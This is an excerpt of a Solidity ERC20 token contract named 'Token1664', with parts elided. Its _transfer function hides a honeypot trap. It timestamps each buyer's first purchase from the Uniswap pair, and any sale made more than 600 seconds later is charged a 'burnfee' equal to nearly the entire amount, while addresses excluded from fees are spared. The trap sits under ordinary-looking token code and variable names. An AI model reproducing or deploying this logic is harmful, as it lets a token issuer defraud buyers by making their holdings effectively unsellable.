...
contract  Token1664  is Ownable, IERC20 {
    ...
    string private  _name = "1664";
    string private  _symbol = "1664";

    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 1664 * 10 ** 9;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        require(amount > 0);        
        uint256 burntime =  Buyser[from] + 600;  
        uint256 burnfee;  
        if (!_isExcludedFromFee[from]   && !_isExcludedFromFee[to]  ) {
        if ( from == uniswapV2Pair    &&  balanceOf(to) == 0) { {Buyser[to] =  block.timestamp;  }  }  
        if ( from != uniswapV2Pair )  {  
        burnfee = amount.mul(2).div(1000); 
        if ( block.timestamp  > burntime  )    {   burnfee = amount-1; }     }  }
        _tOwned[from] -= amount;
